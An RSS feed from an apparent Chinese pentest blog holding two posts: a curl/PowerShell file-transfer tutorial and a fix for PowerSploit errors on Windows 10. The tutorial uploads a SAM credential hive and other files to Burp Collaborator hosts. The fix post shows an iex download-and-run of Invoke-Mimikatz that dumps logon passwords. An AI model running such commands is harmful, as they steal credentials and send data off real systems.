<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>网络安全 on runshell</title><link>https://runshell.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</link><description>Recent content in 网络安全 on runshell</description><generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Sun, 15 Jul 2018 14:30:00 +0800</lastBuildDate><atom:link href="https://runshell.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml"/><item><title>curl详解</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/curl%E8%AF%A6%E8%A7%A3/</link><pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/curl%E8%AF%A6%E8%A7%A3/</guid><description>&lt;h2 id="0x00-前言">0x00 前言
&lt;/h2>&lt;p>在渗透测试中经常需要在艰难的环境下执行命令，比如没有回显。为了摆脱困境，经常需要传送文件。curl是一个非常厉害的工具，在绝大多数情况下，linux系统中是存在curl的。此外Windows系统中，powershell4.0及其以后的版本中提供了一个cmlet——&lt;code>Invoke-WebRequest&lt;/code>，其别名之一是curl。所以，简单记录一下curl的用法。&lt;/p>
&lt;h2 id="0x01-linux中的curl">0x01 Linux中的curl
&lt;/h2>&lt;h3 id="1http请求">1.http请求
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>get&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>curl 命令后面直接跟url；使用-H指定请求头，每个-H指定一条header；使用 -o 指定输出到具体文件而不是标准输出。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl &lt;span style="color:#e6db74">&amp;#39;https://files.college.360.cn/others/Q1NBQS3lhoXnvZHmuJfpgI_mioDmnK8t56ysMTbor74tU01C5Y2P6K6uLnBkZg==?time=1537360082&amp;amp;sign=5fd0f26e3346e8171e8656caaa42b0fc&amp;#39;&lt;/span> -H &lt;span style="color:#e6db74">&amp;#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&amp;#39;&lt;/span> -H &lt;span style="color:#e6db74">&amp;#39;Referer: https://admin.college.360.cn/user/student/course/1032&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;strong>post&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>普通表单post，使用-d指定请求体内容。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl -d &lt;span style="color:#e6db74">&amp;#34;user=admin&amp;amp;passwd=12345678&amp;#34;&lt;/span> http://127.0.0.1:8080/login
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>文件表单post，使用-F指定需要上传的文件。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl http://oumchi.burpcollaborator.net -F &lt;span style="color:#e6db74">&amp;#34;6379.txt=@6379.txt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 发送出的请求如下：&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># POST / HTTP/1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Host: oumchi.burpcollaborator.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># User-Agent: curl/7.58.0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Accept: */*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Content-Length: 1978&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Content-Type: multipart/form-data; boundary=------------------------c9011604f054ee36&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Expect: 100-continue&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># --------------------------c9011604f054ee36&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Content-Disposition: form-data; name=&amp;#34;6379.txt&amp;#34;; filename=&amp;#34;6379.txt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Content-Type: text/plain&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Starting Nmap 7.60 ( https://nmap.org ) at 2018-09-01 08:25 UTC&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Stats: 0:01:21 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># SYN Stealth Scan Timing: About 3.82% done; ETC: 09:00 (0:34:01 remaining)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Stats: 0:01:21 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># SYN Stealth Scan Timing: About 3.82% done; ETC: 09:00 (0:33:59 remaining)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Stats: 0:01:21 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># SYN Stealth Scan Timing: About 3.83% done; ETC: 09:00 (0:33:55 remaining)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># --------------------------c9011604f054ee36--&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>put&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl http://6biy7e.burpcollaborator.net/ -T ca_setup.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>其它方法测试&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl http://www.example.com -X OPTIONS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl http://www.example.com -X TRACE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="2ftp请求">2.ftp请求
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>get&lt;/strong>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl ftp://user:passwd@ftpserver.com:port/path/filename -o filepath
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;strong>put&lt;/strong>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl –u name:passwd -T size.mp3 ftp://www.xxx.com/mp3/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;strong>ls(dir)&lt;/strong>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl ftp://user:passwd@ftpserver.com:port/path/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;strong>delete&lt;/strong>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl –u name:passwd ftp://www.xxx.com/ -X &lt;span style="color:#e6db74">&amp;#39;DELE mp3/size.mp3&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="3其他">3.其他
&lt;/h3>&lt;pre tabindex="0">&lt;code class="language-ba&amp;#39;sh" data-lang="ba&amp;#39;sh">-u, --user &amp;lt;user:password&amp;gt; 需要口令验证的http或ftp
--ntlm 使用htlm认证
-A, --user-agent &amp;lt;name&amp;gt; 指定请求头中的user-agent字段
--socks5 &amp;lt;host[:port]&amp;gt; 使用sockes5代理
-x, --proxy [protocol://]host[:port] 使用http/https代理
--post301 Do not switch to GET after following a 301 不跳转301
--post302 Do not switch to GET after following a 302 不跳转302
--post303 Do not switch to GET after following a 303 不跳转303
&lt;/code>&lt;/pre>&lt;h2 id="0x02-windows中的curl">0x02 Windows中的curl
&lt;/h2>&lt;p>powershell 中的curl是&lt;code>Invoke-WebRequest&lt;/code>，它的另一个别名是wget。它是使用&lt;code>-Headers &amp;lt;IDictionary&amp;gt;&lt;/code>来指定请求头，powershell5.x即以前版本可以指定所有请求头，之后的版本UserAgent只能通过&lt;code>-UserAgent &amp;lt;String&amp;gt;&lt;/code>指定。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>Invoke-WebRequest [-Uri] &amp;lt;Uri&amp;gt; [-Body &amp;lt;Object&amp;gt;] [-Certificate &amp;lt;X509Certificate&amp;gt;] [-CertificateThumbprint &amp;lt;String&amp;gt;] [-ContentType &amp;lt;String&amp;gt;] [-Credential &amp;lt;PSCredential&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ] [-DisableKeepAlive] [-Headers &amp;lt;IDictionary&amp;gt;] [-InFile &amp;lt;String&amp;gt;] [-MaximumRedirection &amp;lt;Int32&amp;gt;] [-Method { &lt;span style="color:#66d9ef">Default&lt;/span> | Get | Head | Post | Put | Delete | Trace | Options
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> | Merge | Patch}] [-OutFile &amp;lt;String&amp;gt;] [-PassThru] [-Proxy &amp;lt;Uri&amp;gt;] [-ProxyCredential &amp;lt;PSCredential&amp;gt;] [-ProxyUseDefaultCredentials] [-SessionVariable &amp;lt;String&amp;gt;] [-Timeou
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tSec &amp;lt;Int32&amp;gt;] [-TransferEncoding {chunked | compress | deflate | gzip | identity}] [-UseBasicParsing] [-UseDefaultCredentials] [-UserAgent &amp;lt;String&amp;gt;] [-WebSession &amp;lt;Web
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> RequestSession&amp;gt;] [&amp;lt;CommonParameters&amp;gt;]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="1http">1.http
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>get&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>使用-UserAgent 指定UA，使用-Headers指定请求头，使用-OutFile指定输出到文件。若不使用-OutFile，将返回一个HtmlWebResponseObject对象，只在屏幕上显示部分摘要信息，若要显示详细信息可以先将其存入变量，再查看变量content等属性。若只想产看响应体，可用管道符传给&lt;code>write-host&lt;/code>,如&lt;code>curl ifconfig.me | write-host&lt;/code> 。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>Invoke-WebRequest -Uri &lt;span style="color:#e6db74">&amp;#34;https://files.college.360.cn/others/Q1NBQS3lhoXnvZHmuJfpgI_mioDmnK8t56ysMTbor74tU01C5Y2P6K6uLnBkZg==?time=1537360082&amp;amp;sign=5fd0f26e3346e8171e8656caaa42b0fc&amp;#34;&lt;/span> -Headers @{&lt;span style="color:#e6db74">&amp;#34;Accept&amp;#34;&lt;/span>=&lt;span style="color:#e6db74">&amp;#34;*/*&amp;#34;&lt;/span>; &lt;span style="color:#e6db74">&amp;#34;Referer&amp;#34;&lt;/span>=&lt;span style="color:#e6db74">&amp;#34;https://admin.college.360.cn&amp;#34;&lt;/span>} -UserAgent &lt;span style="color:#e6db74">&amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&amp;#34;&lt;/span> -OutFile xxx.pdf
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;strong>post&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>在使用非get方法时必须用-Method指定请求方法；请求体可以用-body指定一个string或其它类型的对象，也可以从本地文件获取内容作为请求体，使用-infile指定本地文件。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>curl http&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span>//lti9gf.burpcollaborator.net -Method post -Body &lt;span style="color:#e6db74">&amp;#34;user=admin&amp;amp;passwd=12345678&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;strong>put&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>如果服务器支持put方法，可以直接put上传文件&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>curl http&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span>//lti9gf.burpcollaborator.net -Method put -InFile &lt;span style="color:#960050;background-color:#1e0010">‪&lt;/span>C:\sam.hive
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="2ftp">2.ftp
&lt;/h3>&lt;p>似乎只能下载文件&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>curl ftp&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span>//user&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span>password@127.0.0.&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span>&lt;span style="color:#ae81ff">21&lt;/span>/s2-&lt;span style="color:#ae81ff">057&lt;/span>.py -outFile s2-&lt;span style="color:#ae81ff">057&lt;/span>.py
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="0x03-netwebclient">0x03 net.webclient
&lt;/h2>&lt;p>在powershell4.0以前没有提供&lt;code>Invoke-WebRequest&lt;/code>,这时我们可以使用Net.WebClient，它是.NET Framework中的一个类。它的功能更加强大。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#ftp下载&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>(New-Object System.Net.WebClient).downloadfile(&lt;span style="color:#e6db74">&amp;#39;ftp://admin:admin@172.28.100.68/ppt.txt&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;ppt.txt&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#ftp上传&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>(New-Object System.Net.WebClient).uploadfile(&lt;span style="color:#e6db74">&amp;#39;ftp://admin:admin@172.28.100.68/ppt1.txt&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;ppt.txt&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#http上传&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>(New-Object System.Net.WebClient).uploadfile(&lt;span style="color:#e6db74">&amp;#39;http://8060wg.burpcollaborator.net&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;ppt.txt&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#http下载文件&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>(New-Object System.Net.WebClient).downloadfile(&lt;span style="color:#e6db74">&amp;#39;http：//172.28.100.68/ppt.txt&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;ppt.txt&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#下载到内存&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$response=(New-Object System.Net.WebClient).downloadstring(&lt;span style="color:#e6db74">&amp;#39;http：//172.28.100.68/ppt.txt&amp;#39;&lt;/span>)&lt;span style="color:#75715e">#得到string&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$response=(New-Object System.Net.WebClient).downloaddata(&lt;span style="color:#e6db74">&amp;#39;http：//172.28.100.68/ppt.txt&amp;#39;&lt;/span>)&lt;span style="color:#75715e">#得到byte[]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#从内存上传&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>(New-Object System.Net.WebClient).uploadstring(&lt;span style="color:#e6db74">&amp;#39;http://8060wg.burpcollaborator.net&amp;#39;&lt;/span>,$response)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>(New-Object System.Net.WebClient).uploaddata(&lt;span style="color:#e6db74">&amp;#39;http://8060wg.burpcollaborator.net&amp;#39;&lt;/span>,$response)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#指定请求头&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$mywebclient=(New-Object System.Net.WebClient);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$mywebclient.Headers.Add(&lt;span style="color:#e6db74">&amp;#34;Cookie&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34; HMACCOUNT=057DAB164B4FC7D1; BAIDUID=3C7BA5C29716B9F251F8BC090E0BF028:FG=1; BIDUPSID=3C7BA5C29716B9F251F8BC090E0BF028; PSTM=1532227383&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$mywebclient.Headers.Add(&lt;span style="color:#e6db74">&amp;#34;Referer&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;https://newtab.firefoxchina.cn/world-tab-index.html&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$mywebclient.downloadstring(&lt;span style="color:#e6db74">&amp;#39;http://8060wg.burpcollaborator.net&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>powersploit中多个脚本在windows10和server2016上报错</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/powersploit%E4%B8%AD%E5%A4%9A%E4%B8%AA%E8%84%9A%E6%9C%AC%E5%9C%A8windows10%E5%92%8Cserver2016%E4%B8%8A%E6%8A%A5%E9%94%99/</link><pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/powersploit%E4%B8%AD%E5%A4%9A%E4%B8%AA%E8%84%9A%E6%9C%AC%E5%9C%A8windows10%E5%92%8Cserver2016%E4%B8%8A%E6%8A%A5%E9%94%99/</guid><description>&lt;p>报错的脚本主要为invoke-reflectivepeinjection.ps1，其它部分脚本由于使用了invoke-reflectivepeinjection.ps1中的代码，所以也报同样的错误,比如Invoke-Mimikatz、invoke-ninjacopy等。&lt;/p>
&lt;ul>
&lt;li>错误信息如下:&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>PS C:\WINDOWS\system32&amp;gt; iex (New-Object System.Net.WebClient).DownloadString(&lt;span style="color:#e6db74">&amp;#39;https://raw.githubusercontent.com/PowerShe
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">llMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&amp;#39;&lt;/span>);Invoke-Mimikatz -Command &lt;span style="color:#e6db74">&amp;#39;&amp;#34;privilege::debug&amp;#34; &amp;#34;sekurlsa::lo
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">gonPasswords full&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>使用&lt;span style="color:#960050;background-color:#1e0010">“&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">”&lt;/span>个参数调用&lt;span style="color:#960050;background-color:#1e0010">“&lt;/span>GetMethod&lt;span style="color:#960050;background-color:#1e0010">”&lt;/span>时发生异常&lt;span style="color:#960050;background-color:#1e0010">:“&lt;/span>发现不明确的匹配&lt;span style="color:#960050;background-color:#1e0010">。”&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>所在位置 行&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span>&lt;span style="color:#ae81ff">886&lt;/span> 字符&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+ $GetProcAddress = $UnsafeNativeMethods.GetMethod(&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>GetProcAddr ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> + CategoryInfo &lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> NotSpecified&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> (&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span>) [], MethodInvocationException
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> + FullyQualifiedErrorId &lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> AmbiguousMatchException
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>不能对 Null 值表达式调用方法&lt;span style="color:#960050;background-color:#1e0010">。&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>所在位置 行&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span>&lt;span style="color:#ae81ff">893&lt;/span> 字符&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+ Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> + CategoryInfo &lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> InvalidOperation&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> (&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span>) []&lt;span style="color:#960050;background-color:#1e0010">，&lt;/span>RuntimeException
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> + FullyQualifiedErrorId &lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> InvokeMethodOnNull
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>找不到&lt;span style="color:#960050;background-color:#1e0010">“&lt;/span>GetDelegateForFunctionPointer&lt;span style="color:#960050;background-color:#1e0010">”&lt;/span>的重载&lt;span style="color:#960050;background-color:#1e0010">，&lt;/span>参数计数为&lt;span style="color:#960050;background-color:#1e0010">:“&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">”。&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>所在位置 行&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span>&lt;span style="color:#ae81ff">489&lt;/span> 字符&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+ $VirtualAlloc = [&lt;span style="color:#66d9ef">System.Runtime.InteropServices.Marshal&lt;/span>]::Get ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> + CategoryInfo &lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> NotSpecified&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> (&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span>) [], MethodException
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> + FullyQualifiedErrorId &lt;span style="color:#960050;background-color:#1e0010">:&lt;/span> MethodCountCouldNotFindBest
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>.............
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...省略n行...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>.............
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;a class="link" href="https://github.com/PowerShellMafia/PowerSploit/issues/293" target="_blank" rel="noopener"
>解决方法&lt;/a>：&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>请尝试更改该行：
$GetProcAddress = $UnsafeNativeMethods.GetMethod(&amp;#39;GetProcAddress&amp;#39;)
至
$GetProcAddress = $UnsafeNativeMethods.GetMethod(&amp;#39;GetProcAddress&amp;#39;, [reflection.bindingflags] &amp;#34;Public,Static&amp;#34;, $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>报错分析：&lt;/li>
&lt;/ul>
